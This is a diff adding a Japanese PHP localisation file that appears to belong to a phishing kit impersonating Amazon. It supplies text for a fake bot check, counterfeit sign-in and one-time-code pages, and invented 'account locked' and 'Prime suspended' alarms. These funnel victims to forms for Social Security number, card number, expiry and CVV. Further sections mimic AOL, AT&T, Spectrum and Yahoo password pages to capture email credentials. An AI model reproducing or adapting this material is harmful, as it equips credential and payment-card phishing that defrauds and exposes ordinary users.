@@ -1,0 +1,386 @@
+<?php
+// CAPTCHA
+$lang['captcha']['title']           = "注意が必要です！ | セキュリティチェック";
+$lang['captcha']['checking']        = "アクセスする前にブラウザを確認しています...";
+$lang['captcha']['titlepage']       = "私はロボットではありません";
+$lang['captcha']['recaptcha']       = "reCAPTCHA";
+$lang['captcha']['privacy']         = "プライバシー • 規約";
+$lang['captcha']['aboutthepage']    = "このページについて";
+$lang['captcha']['verify_action']   = "以下の操作を完了して、人間であることを確認してください。";
+$lang['captcha']['notedthepage']    = "当システムはお客様のネットワークからの異常なトラフィックを検出しました。このページはリクエストを送信しているのが本当にお客様であり、ロボットではないことを確認します。";
+$lang['captcha']['ipaddress']       = "IP アドレス:";
+$lang['captcha']['date']            = "日時:";
+$lang['captcha']['verifying']       = "確認中...";
+$lang['captcha']['verified']        = "確認済み";
+
+// CLOUDFLARE
+$lang['cloudflare']['name']          = "Cloudflare";
+$lang['cloudflare']['title']         = "しばらくお待ちください...";
+$lang['cloudflare']['titlepage']     = "人間であることを確認しています。数秒かかる場合があります。";
+$lang['cloudflare']['verifyhuman']   = "人間であることを確認してください";
+$lang['cloudflare']['privacy']       = "プライバシー • 規約";
+$lang['cloudflare']['verify_action'] = "以下の操作を完了して、人間であることを確認してください。";
+$lang['cloudflare']['verify_message']= "接続のセキュリティを確認する必要があります。";
+$lang['cloudflare']['verifying']     = "確認中...";
+$lang['cloudflare']['success']       = "成功";
+$lang['cloudflare']['enable']        = "続行するには JavaScript と Cookie を有効にしてください";
+$lang['cloudflare']['know']          = "ご存知ですか？";
+$lang['cloudflare']['bottraffic']    = "機械学習を使用してボットトラフィックを特定・防御している企業はありますか？";
+$lang['cloudflare']['rayid']         = "Ray ID:";
+
+// PAGE LOGIN
+$lang['login']['language']           = "日本語";
+$lang['login']['title']              = "Amazon サインイン";
+$lang['login']['signin']             = "サインイン";
+$lang['login']['titlealertsignin']   = "問題が発生しました";
+$lang['login']['alertsignin']        = "そのメールアドレスのアカウントが見つかりません";
+$lang['login']['emailorphone']       = "Eメールまたは携帯電話番号";
+$lang['login']['usernameEmpty']      = "メールアドレスまたは携帯電話番号を入力してください";
+$lang['login']['usernameInvalid']    = "有効なメールアドレスまたは電話番号を入力してください";
+$lang['login']['continue']           = "続行";
+$lang['login']['continuing']         = "続行すると、Amazonの";
+$lang['login']['forgot']             = "パスワードを忘れましたか？";
+$lang['login']['other']              = "サインインに関するその他の問題";
+$lang['login']['change']             = "変更";
+$lang['login']['password']           = "パスワード";
+$lang['login']['passwordEmpty']      = "パスワードを入力してください";
+$lang['login']['passwordInvalid']    = "パスワードは8文字以上である必要があります";
+$lang['login']['or']                 = "または";
+$lang['login']['passkey']            = "パスキーでサインイン";
+$lang['login']['showpassword']       = "パスワードを表示";
+$lang['login']['buyer']              = "仕事用に購入しますか？";
+$lang['login']['shop']               = "Amazonビジネスで購入";
+$lang['login']['new']                = "Amazonを初めて利用しますか？";
+$lang['login']['create']             = "Amazonアカウントを作成";
+$lang['login']['conditions']         = "利用規約";
+$lang['login']['privacy']            = "プライバシー規約";
+$lang['login']['cookies']            = "Cookieに関するお知らせ";
+$lang['login']['needhelp']           = "ヘルプが必要ですか？";
+$lang['login']['help']               = "ヘルプ";
+$lang['login']['copyright']          = "© 1996-" . date("Y") . "、Amazon.com, Inc. またはその関連会社";
+
+// PAGE OTP
+$lang['otp']['language']             = "日本語";
+$lang['otp']['title']                = "Amazon: 二段階認証";
+$lang['otp']['titleotp']             = "二段階認証";
+$lang['otp']['pagetitle']            = "セキュリティのため、コードをメールに送信しました";
+$lang['otp']['phonepagetitle']       = "追加のセキュリティとして、電話番号に送信されたワンタイムパスコード (OTP) を入力してください";
+$lang['otp']['titlepage']            = "OTP を入力";
+$lang['otp']['otpcheckbox']          = " このブラウザでは OTP を要求しない";
+$lang['otp']['titlealertotp']        = "問題が発生しました";
+$lang['otp']['otpinvalid']           = "入力したコードが無効です。コードを確認して、もう一度お試しください。";
+$lang['otp']['waiting']              = "別のコードをリクエストする前に %s 秒お待ちください。";
+$lang['otp']['otpEmpty']             = "確認コードを入力してください";
+$lang['otp']['otpInvalid']           = "有効な確認コードを入力してください";
+$lang['otp']['submitcode']           = "コードを送信";
+$lang['otp']['wait']                 = "お待ちください ...";
+$lang['otp']['needhelp']             = "ヘルプが必要ですか？";
+$lang['otp']['differentway']         = "コードを受け取れない場合、またはメールアドレスや電話番号を変更した場合は、<a href='#gp'>別の方法を試してください</a>。";
+$lang['otp']['conditions']           = "利用規約";
+$lang['otp']['privacy']              = "プライバシー規約";
+$lang['otp']['cookies']              = "Cookieに関するお知らせ";
+$lang['otp']['help']                 = "ヘルプ";
+$lang['otp']['copyright']            = "© 1996-" . date("Y") . "、Amazon.com, Inc. またはその関連会社";
+
+// PAGE UNUSUAL
+$lang['unusual']['language']             = "日本語";
+$lang['unusual']['title']                = "Amazon: 異常なアクティビティ";
+$lang['unusual']['titleunusual']         = "お客様のAmazonアカウントに異常なアクティビティが検出されました";
+$lang['unusual']['pagetitle']            = "Amazonアカウントへ安全にアクセスする前に、いくつかの手順を行うことをお勧めします。";
+$lang['unusual']['step1']                = "ステップ 1";
+$lang['unusual']['infostep1']            = "請求先住所情報を確認してください";
+$lang['unusual']['alertstep1']           = "Amazonアカウントにリンクされた請求先住所を確認してください。";
+$lang['unusual']['step2']                = "ステップ 2";
+$lang['unusual']['infostep2']            = "お支払い方法を確認してください";
+$lang['unusual']['alertstep2']           = "誰かがお客様のAmazonアカウントのお支払い方法を変更または使用した可能性があります。アカウントにリンクされた支払い情報を提供してください。";
+$lang['unusual']['verifnow']             = "今すぐ確認";
+$lang['unusual']['needhelp']             = "ヘルプが必要ですか？";
+$lang['unusual']['differentway']         = "この異常なアクティビティに心当たりがない場合は、指示に従ってアカウントを保護してください。";
+$lang['unusual']['conditions']           = "利用規約";
+$lang['unusual']['privacy']              = "プライバシー規約";
+$lang['unusual']['cookies']              = "クッキーポリシー";
+$lang['unusual']['help']                 = "ヘルプ";
+$lang['unusual']['copyright']            = "© 1996-" . date("Y") . "、Amazon.com, Inc. またはその関連会社";
+
+// PAGE SUSPICIOUS
+$lang['suspicious']['language']          = "日本語";
+$lang['suspicious']['title']             = "Amazon: 請求に関する問題";
+$lang['suspicious']['titlesuspicious']   = "請求に関する問題のため、お客様のAmazonアカウントは保留されています";
+$lang['suspicious']['pagetitle']         = "以下の手順に従って、お支払い方法を更新してください。";
+$lang['suspicious']['step1']             = "ステップ 1";
+$lang['suspicious']['infostep1']         = "請求先住所情報を更新してください";
+$lang['suspicious']['alertstep1']        = "Amazonアカウントにリンクされた請求先住所を更新してください。";
+$lang['suspicious']['step2']             = "ステップ 2";
+$lang['suspicious']['infostep2']         = "お支払い方法を更新してください";
+$lang['suspicious']['alertstep2']        = "誰かがお客様のAmazonアカウントのお支払い方法を変更または使用した可能性があります。アカウントにリンクされた支払い情報を確認してください。";
+$lang['suspicious']['verifnow']          = "今すぐ確認";
+$lang['suspicious']['needhelp']          = "ヘルプが必要ですか？";
+$lang['suspicious']['differentway']      = "このアクティビティに心当たりがない場合、または対応に迷う場合は、案内された手順に従ってアカウントを保護してください。";
+$lang['suspicious']['conditions']        = "利用規約";
+$lang['suspicious']['privacy']           = "プライバシー規約";
+$lang['suspicious']['help']              = "ヘルプ";
+$lang['suspicious']['copyright']         = "© 1996-" . date("Y") . "、Amazon.com, Inc. またはその関連会社";
+
+// PAGE LOCKED
+$lang['locked']['language']              = "日本語";
+$lang['locked']['title']                 = "Amazon: アクセスがロックされました";
+$lang['locked']['titlelocked']           = "セキュリティ上の理由により、お客様のアカウントはロックされました";
+$lang['locked']['pagetitle']             = "Amazonアカウントのロックを解除するには、直ちに以下の手順を行うことをお勧めします。";
+$lang['locked']['step1']                 = "ステップ 1";
+$lang['locked']['infostep1']             = "請求先住所情報を確認してください";
+$lang['locked']['alertstep1']            = "Amazonアカウントにリンクされた請求先住所を確認してください。";
+$lang['locked']['step2']                 = "ステップ 2";
+$lang['locked']['infostep2']             = "お支払い方法を確認してください";
+$lang['locked']['alertstep2']            = "誰かがお客様のAmazonアカウントのお支払い方法を変更または使用した可能性があります。アカウントにリンクされた支払い情報を確認してください。";
+$lang['locked']['verifnow']              = "今すぐ確認";
+$lang['locked']['needhelp']              = "ヘルプが必要ですか？";
+$lang['locked']['differentway']          = "この制限が間違いだと思われる場合や、理由が不明な場合は、指示に従ってアカウントを確認し保護してください。";
+$lang['locked']['conditions']            = "利用規約";
+$lang['locked']['privacy']               = "プライバシー規約";
+$lang['locked']['help']                  = "ヘルプ";
+$lang['locked']['copyright']             = "© 1996-" . date("Y") . "、Amazon.com, Inc. またはその関連会社";
+
+// PAGE PRIME
+$lang['prime']['language']              = "日本語";
+$lang['prime']['title']                 = "Amazon: プライム会員資格が一時停止されました";
+$lang['prime']['titleprime']            = "お客様のAmazonプライム会員資格は " . date("Y年n月j日") . " に更新予定です";
+$lang['prime']['pagetitle']             = "以下の手順に従って、お支払い方法を更新してください。";
+$lang['prime']['step1']                 = "ステップ 1";
+$lang['prime']['infostep1']             = "請求先住所情報を更新してください";
+$lang['prime']['alertstep1']            = "Amazonアカウントにリンクされた請求先住所を更新してください。";
+$lang['prime']['step2']                 = "ステップ 2";
+$lang['prime']['infostep2']             = "お支払い方法を更新してください";
+$lang['prime']['alertstep2']            = "プライム会員資格に関連付けられているカードが無効になっています。お支払い情報を更新してください。";
+$lang['prime']['resume']                = "会員資格を再開する";
+$lang['prime']['needhelp']              = "ヘルプが必要ですか？";
+$lang['prime']['differentway']          = "別の方法で会員資格を復元してください。";
+$lang['prime']['conditions']            = "利用規約";
+$lang['prime']['privacy']               = "プライバシー規約";
+$lang['prime']['help']                  = "ヘルプ";
+$lang['prime']['copyright']             = "© 1996-" . date("Y") . "、Amazon.com, Inc. またはその関連会社";
+
+// PAGE BILLING HEADER
+$lang['billingheader']['language']          = "日本語";
+$lang['billingheader']['titleaddress']      = "Amazon: 住所を確認";
+$lang['billingheader']['titlepayment']      = "Amazon: 支払い方法を確認";
+$lang['billingheader']['deliverto']         = "お届け先";
+$lang['billingheader']['done']              = "完了";
+$lang['billingheader']['all']               = "すべて";
+$lang['billingheader']['selectdepartment']  = "検索したい部門を選択してください";
+$lang['billingheader']['alldepartment']     = "すべての部門";
+$lang['billingheader']['artscrafts']        = "アート・クラフト";
+$lang['billingheader']['automotive']        = "車＆バイク";
+$lang['billingheader']['baby']              = "ベビー";
+$lang['billingheader']['beautypersonal']    = "ビューティー・パーソナルケア";
+$lang['billingheader']['books']             = "本";
+$lang['billingheader']['boysfashion']       = "ボーイズファッション";
+$lang['billingheader']['computers']         = "パソコン・周辺機器";
+$lang['billingheader']['deals']             = "セール";
+$lang['billingheader']['digitalmusic']      = "デジタルミュージック";
+$lang['billingheader']['electronics']       = "家電";
+$lang['billingheader']['girlsfashion']      = "ガールズファッション";
+$lang['billingheader']['health']            = "ヘルス＆ホーム";
+$lang['billingheader']['homekitchen']       = "ホーム＆キッチン";
+$lang['billingheader']['industrial']        = "産業・研究開発用品";
+$lang['billingheader']['searchamazon']      = "Amazonで検索";
+$lang['billingheader']['hello']             = "こんにちは、";
+$lang['billingheader']['accountlist']       = "アカウント＆リスト";
+$lang['billingheader']['returns']           = "返品";
+$lang['billingheader']['orders']            = "注文";
+$lang['billingheader']['rufus']             = "ルーファス";
+$lang['billingheader']['todaysdeals']       = "本日のセール";
+$lang['billingheader']['primevideo']        = "Prime Video";
+$lang['billingheader']['buyagain']          = "再購入";
+$lang['billingheader']['customerservice']   = "カスタマーサービス";
+$lang['billingheader']['registry']          = "ギフトレジストリ";
+$lang['billingheader']['giftcard']          = "ギフト券";
+$lang['billingheader']['sell']              = "販売";
+$lang['billingheader']['disability']        = "障害者向けカスタマーサポート";
+$lang['billingheader']['alertaccount']      = "アカウントは一時的に保留されています";
+$lang['billingheader']['noticealertaccount']    = "お客様のアカウントで異常な支払い活動が確認されたため、直近の注文で使用された支払い方法の所有者確認が必要です。";
+
+// PAGE BILLING PAGE
+$lang['billingpage']['verifyaddress']       = "住所を確認";
+$lang['billingpage']['verifypayment']       = "支払い方法を確認";
+$lang['billingpage']['complete']            = "完了";
+$lang['billingpage']['titleverifyaddress']  = "本人確認をしてください";
+$lang['billingpage']['enterinformation']    = "アカウント情報と一致する内容を入力してください。";
+$lang['billingpage']['country']             = "国/地域";
+$lang['billingpage']['fullname']            = "氏名（名・姓）";
+$lang['billingpage']['alertfullname']       = "氏名を入力してください。";
+$lang['billingpage']['checkalertfullname']  = "氏名（名・姓）を確認してください。";
+$lang['billingpage']['dob']                 = "生年月日";
+$lang['billingpage']['alertdob']            = "生年月日を入力してください。";
+$lang['billingpage']['checkalertdob']       = "生年月日を確認してください。";
+$lang['billingpage']['invalidalertdob']     = "無効な日付です。MM/DD/YYYY形式で入力してください。";
+$lang['billingpage']['dobmust17th']         = "17歳以上である必要があります。";
+$lang['billingpage']['ssn']                 = "社会保障番号";
+$lang['billingpage']['phonenumber']         = "電話番号";
+$lang['billingpage']['alertphonenumber']    = "配送に関する問題がある場合に連絡できる電話番号を入力してください。";
+$lang['billingpage']['assistdelivery']      = "配送を支援するために使用される場合があります";
+$lang['billingpage']['addressline1']        = "住所1";
+$lang['billingpage']['alertaddressline1']   = "住所1を入力してください。";
+$lang['billingpage']['placeaddressline1']   = "番地、町名、または私書箱";
+$lang['billingpage']['addressline2']        = "住所2";
+$lang['billingpage']['placeaddressline2']   = "建物名、部屋番号、階数など";
+$lang['billingpage']['city']                = "市区町村";
+$lang['billingpage']['alertcity']           = "市区町村を入力してください。";
+$lang['billingpage']['state']               = "都道府県";
+$lang['billingpage']['alertstate']          = "都道府県を入力してください。";
+$lang['billingpage']['zipcode']             = "郵便番号";
+$lang['billingpage']['alertzipcode']        = "郵便番号を入力してください。";
+$lang['billingpage']['thismydefault']       = "これを既定の住所にする";
+$lang['billingpage']['backtotop']           = "ページの先頭へ戻る";
+
+// PAGE PAYMENT PAGE
+$lang['paymentpage']['verifyaddress']       = "住所を確認";
+$lang['paymentpage']['verifypayment']       = "支払い方法を確認";
+$lang['paymentpage']['complete']            = "完了";
+$lang['paymentpage']['titleverifypayment']  = "クレジットカードまたはデビットカードを確認";
+$lang['paymentpage']['enterinformation']    = "アカウント情報と一致する内容を入力してください。";
+$lang['paymentpage']['reviewpayment']       = "クレジットカードまたはデビットカードを確認";
+$lang['paymentpage']['paymentreview']       = "カードを確認できませんでした。別のカードを使用し、保存する前に正しいことを確認してください。";
+$lang['paymentpage']['cardname']            = "カード名義人";
+$lang['paymentpage']['alertcardname']       = "カード名義人を入力してください。";
+$lang['paymentpage']['checkalertcardname']  = "カード名義人を確認してください。";
+$lang['paymentpage']['placecardname']       = "カード名義人";
+$lang['paymentpage']['cardnumber']          = "カード番号";
+$lang['paymentpage']['alertcardnumber']     = "カード番号を入力してください。";
+$lang['paymentpage']['checkalertcardnumber']= "無効なカード番号です。有効な番号を入力してください。";
+$lang['paymentpage']['cardexp']             = "有効期限";
+$lang['paymentpage']['requirecardexp']      = "有効期限を入力してください。";
+$lang['paymentpage']['cardexpmust1and12']   = "有効期限の月は01～12でなければなりません。";
+$lang['paymentpage']['cardexpmust22and35']  = "有効期限の年は25～35でなければなりません。";
+$lang['paymentpage']['cardexpinvalid']      = "有効な有効期限を入力してください。";
+$lang['paymentpage']['cvv']                 = "CVVを入力";
+$lang['paymentpage']['alertcvv']            = "CVV/セキュリティコードを入力してください。";
+$lang['paymentpage']['checkalertcvv']       = "3～4桁のCVV/セキュリティコードを入力してください。";
+$lang['paymentpage']['placecvv']            = "3～4桁のコード";
+$lang['paymentpage']['youraddress']         = "ご住所";
+$lang['paymentpage']['infopayment']         = "お客様の情報は暗号化され、安全に保護されています";
+$lang['paymentpage']['alertinfopayment']    = "サービスの中断を避けるため、追加したカードは他の支払い方法が失敗した場合の予備として使用されることがあります。この設定は「お支払い方法」でいつでも変更できます。";
+$lang['paymentpage']['yourinfoname']        = "氏名";
+$lang['paymentpage']['yourinfoaddress']     = "住所";
+$lang['paymentpage']['yourinfocountry']     = "国";
+$lang['paymentpage']['backtotop']           = "ページの先頭へ戻る";
+
+// PAGE COMPLETED
+$lang['completed']['verifyaddress']       = "住所を確認";
+$lang['completed']['verifypayment']       = "支払い方法を確認";
+$lang['completed']['complete']            = "完了";
+$lang['completed']['titlecomplete']       = "確認が完了しました";
+$lang['completed']['infocomplete']        = "アカウントの確認が完了次第、メールにてお知らせいたします。";
+$lang['completed']['backtotop']           = "ページの先頭へ戻る";
+
+// PAGE BILLING FOOTER
+$lang['billingfooter']['gettoknow']         = "Amazonについて知る";
+$lang['billingfooter']['careers']           = "採用情報";
+$lang['billingfooter']['blog']              = "ブログ";
+$lang['billingfooter']['aboutamazon']       = "Amazonについて";
+$lang['billingfooter']['investor']          = "投資家向け情報";
+$lang['billingfooter']['amazondevices']     = "Amazonデバイス";
+$lang['billingfooter']['amazonscience']     = "Amazon Science";
+$lang['billingfooter']['makemoney']         = "Amazonで稼ぐ";
+$lang['billingfooter']['sellproducts']      = "Amazonで商品を販売";
+$lang['billingfooter']['sellbusiness']      = "Amazonビジネスで販売";
+$lang['billingfooter']['sellapps']          = "Amazonでアプリを販売";
+$lang['billingfooter']['becomeaffiliate']   = "アフィリエイトになる";
+$lang['billingfooter']['advertise']         = "商品を広告する";
+$lang['billingfooter']['selfpublish']       = "セルフ出版する";
+$lang['billingfooter']['hostamazonhub']     = "Amazon Hubを設置";
+$lang['billingfooter']['seemore']           = "さらにAmazonで稼ぐ方法を見る";
+$lang['billingfooter']['amazonpayment']     = "Amazonのお支払い商品";
+$lang['billingfooter']['amazonbusiness']    = "Amazonビジネスカード";
+$lang['billingfooter']['shopwithpoints']    = "ポイントでお買い物";
+$lang['billingfooter']['reloadbalance']     = "残高を追加";
+$lang['billingfooter']['amazoncurrency']    = "Amazon通貨コンバーター";
+$lang['billingfooter']['letushelp']         = "ヘルプ＆サポート";
+$lang['billingfooter']['youraccount']       = "アカウントサービス";
+$lang['billingfooter']['yourorders']        = "注文履歴";
+$lang['billingfooter']['shippingrates']     = "配送・送料について";
+$lang['billingfooter']['returnsreplace']    = "返品・交換";
+$lang['billingfooter']['manageyourcontent'] = "コンテンツと端末の管理";
+$lang['billingfooter']['help']              = "ヘルプ";
+$lang['billingfooter']['language']          = "日本語";
+$lang['billingfooter']['symbolmoney']       = "¥";
+$lang['billingfooter']['money']             = "JPY - 日本円";
+$lang['billingfooter']['conditions']        = "利用規約";
+$lang['billingfooter']['privacy']           = "プライバシー規約";
+$lang['billingfooter']['consumer']          = "消費者健康データプライバシー通知";
+$lang['billingfooter']['adsprivacy']        = "広告プライバシーの選択";
+$lang['billingfooter']['copyright']         = "© 1996-" . date("Y") . "、Amazon.com, Inc. またはその関連会社";
+
+// PAGE AOL
+$lang['emailaol']['title']          = "AOL";
+$lang['emailaol']['enterpassword']  = "パスワードを入力";
+$lang['emailaol']['finishsignin']   = "サインインを完了するには";
+$lang['emailaol']['inputpassword']  = "パスワード";
+$lang['emailaol']['alertfailed']    = "パスワードが無効です。もう一度お試しください。";
+$lang['emailaol']['next']           = "次へ";
+$lang['emailaol']['forgot']         = "パスワードを忘れた場合";
+$lang['emailaol']['legacy']         = "AOLは最新バージョンのブラウザで最適に動作します。古いまたはサポートされていないブラウザを使用しているため、AOLの一部機能が正しく動作しない可能性があります。ブラウザのバージョンを今すぐ更新してください。<a href='#'>詳細情報</a>";
+
+// PAGE ATT
+$lang['emailatt']['title']          = "Login Screen";
+$lang['emailatt']['signin']         = "Sign in";
+$lang['emailatt']['tomyatt']        = "to myAT&T";
+$lang['emailatt']['alertfailed']    = "Incorrect Password, Try again.";
+$lang['emailatt']['carealert']      = "Care code: ";
+$lang['emailatt']['inputpassword']  = "Password";
+$lang['emailatt']['show']           = "Show";
+$lang['emailatt']['keepsignin']     = "Keep me signed in";
+$lang['emailatt']['forgot']         = "Forgot user ID?";
+$lang['emailatt']['donthave']       = "Don't have a user ID?";
+$lang['emailatt']['createone']      = "Create one now";
+$lang['emailatt']['paywithout']     = "Pay without signing in";
+$lang['emailatt']['legal']          = "Legal policy center";
+$lang['emailatt']['privacy']        = "Privacy policy";
+$lang['emailatt']['terms']          = "Terms of use";
+$lang['emailatt']['accessibility']  = "Accessibility";
+$lang['emailatt']['privacychoice']  = "Your privacy choices";
+$lang['emailatt']['copyright']      = "AT&T Intellectual Property. All rights reserved.";
+
+// PAGE CHARTER
+$lang['emailcharter']['title']          = "Login TWC & Roadrunner RR Email | Spectrum Webmail";
+$lang['emailcharter']['skiptocontent']  = "Skip to Main Content";
+$lang['emailcharter']['menu']           = "MENU";
+$lang['emailcharter']['manageaccount']  = "Manage Account";
+$lang['emailcharter']['getsupport']     = "Get Support";
+$lang['emailcharter']['watchtv']        = "Watch TV";
+$lang['emailcharter']['support']        = "Support";
+$lang['emailcharter']['signintomail']   = "Sign In to Webmail";
+$lang['emailcharter']['createemail']    = "Create an Email Address";
+$lang['emailcharter']['emailaddress']   = "Email Address";
+$lang['emailcharter']['emailpassword']  = "Email Password";
+$lang['emailcharter']['signin']         = "Sign In";
+$lang['emailcharter']['forgotemail']    = "Forgot Email Address?";
+$lang['emailcharter']['forgotpassword'] = "Forgot Email Password?";
+$lang['emailcharter']['copyright']      = "2022 Charter Communications. All rights reserved";
+$lang['emailcharter']['withus']         = "Advertise with Us";
+$lang['emailcharter']['privacy']        = "Your Privacy Rights";
+$lang['emailcharter']['policy']         = "Web Privacy Policy";
+$lang['emailcharter']['dontsell']       = "California Consumer Do Not Sell Or Share My Personal Information";
+$lang['emailcharter']['limittheuse']    = "California Consumer Limit The Use Of My Sensitive Personal Information";
+$lang['emailcharter']['subscriber']     = "Spectrum Subscriber Policies";
+$lang['emailcharter']['inc']            = "Time Warner Cable and the Time Warner Cable logo are trademarks of Time Warner Inc., used under license.";
+
+// PAGE HOT FAMILY
+$lang['emailhotfams']['title']              = "アカウントにサインイン";
+$lang['emailhotfams']['enterpassword']      = "パスワードを入力";
+$lang['emailhotfams']['alertfailed']        = "無効なパスワードです。もう一度お試しください。";
+$lang['emailhotfams']['forgot']             = "パスワードをお忘れですか";
+$lang['emailhotfams']['signin']             = "サインイン";
+$lang['emailhotfams']['terms']              = "利用規約";
+$lang['emailhotfams']['privacy']            = "プライバシーとクッキー";
+$lang['emailhotfams']['...']                = "...";
+
+// PAGE Yahoo
+$lang['emailyahoo']['title']            = "Yahoo";
+$lang['emailyahoo']['enterpassword']    = "パスワードを入力";
+$lang['emailyahoo']['finishsignin']     = "サインインを完了するには";
+$lang['emailyahoo']['inputpassword']    = "パスワード";
+$lang['emailyahoo']['alertfailed']      = "パスワードが無効です。もう一度お試しください。";
+$lang['emailyahoo']['next']             = "次へ";
+$lang['emailyahoo']['forgot']           = "パスワードを忘れた場合";
+$lang['emailyahoo']['legacy']           = "Yahooは最新バージョンのブラウザで最適に動作します。古いまたはサポートされていないブラウザを使用しているため、Yahooの一部機能が正しく動作しない可能性があります。ブラウザのバージョンを今すぐ更新してください。<a href='#'>詳細情報</a>";
+?>
